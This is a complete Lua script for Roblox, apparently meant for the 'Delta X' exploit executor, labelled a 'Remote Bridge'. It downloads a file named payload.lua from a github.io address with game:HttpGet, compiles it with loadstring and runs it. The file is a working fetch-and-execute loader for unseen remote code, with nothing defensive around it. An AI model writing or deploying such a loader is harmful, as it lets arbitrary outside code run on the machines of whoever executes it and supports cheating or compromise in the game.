-- CyberOS Delta X Remote Bridge
local HttpService = game:GetService("HttpService")

print("[CyberOS] Initializing Delta X Remote Bridge...")

local function executeRemotePayload()
    local success, response = pcall(function()
        -- Ссылка на твой хост или файл в репозитории
        return game:HttpGet("https://nazaroksenenko088-svg.github.io/Veb_comand/scripts/payload.lua")
    end)

    if success and response then
        print("[CyberOS] Payload loaded. Executing in protected environment...")
        local fn, err = loadstring(response)
        if fn then
            pcall(fn)
        else
            warn("[CyberOS] Compilation error: " .. tostring(err))
        end
    else
        warn("[CyberOS] Connection to payload source failed.")
    end
end

executeRemotePayload()
